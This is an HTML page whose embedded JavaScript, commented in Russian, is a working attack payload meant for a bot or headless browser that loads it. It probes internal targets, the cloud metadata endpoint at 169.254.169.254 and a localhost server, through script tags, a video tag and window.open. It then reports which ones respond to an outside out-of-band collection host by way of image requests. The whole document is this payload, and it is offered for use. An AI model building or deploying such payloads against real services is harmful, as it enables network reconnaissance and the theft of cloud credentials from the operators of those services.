<!DOCTYPE html>
<html>
<body>
    <script>
        const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";

        function log(msg) {
            new Image().src = oast + "/" + msg + "?r=" + Math.random();
        }

        // 1. Пытаемся загрузить внутренний ресурс как скрипт.
        // Если он загрузится, будет ошибка синтаксиса, но мы узнаем, что он доступен!
        function tryAsScript(url, label) {
            var s = document.createElement('script');
            s.src = url;
            s.onload = () => log("SUCCESS_LOAD_" + label);
            s.onerror = () => log("TRIGGERED_ERROR_" + label); // Это сработает, если ресурс ответил!
            document.body.appendChild(s);
        }

        // 2. Метод через Window.open (иногда боты позволяют это)
        try {
            var win = window.open("http://169.254.169.254/latest/meta-data/", "_blank");
            log("WINDOW_OPEN_ATTEMPT");
        } catch(e) { log("WINDOW_OPEN_BLOCKED"); }

        // Пробуем основные точки
        tryAsScript("http://169.254.169.254/latest/meta-data/", "AZURE_AWS_META");
        tryAsScript("http://127.0.0.1:80/", "LOCAL_SERVER");
        
        // 3. Супер-хак: если мы не можем прочитать текст, мы проверим длину ответа через Video/Audio теги
        var v = document.createElement('video');
        v.src = "http://169.254.169.254/latest/meta-data/";
        v.onloadedmetadata = () => log("METADATA_SIZE_LEAK"); 
        document.body.appendChild(v);

    </script>
</body>
</html>
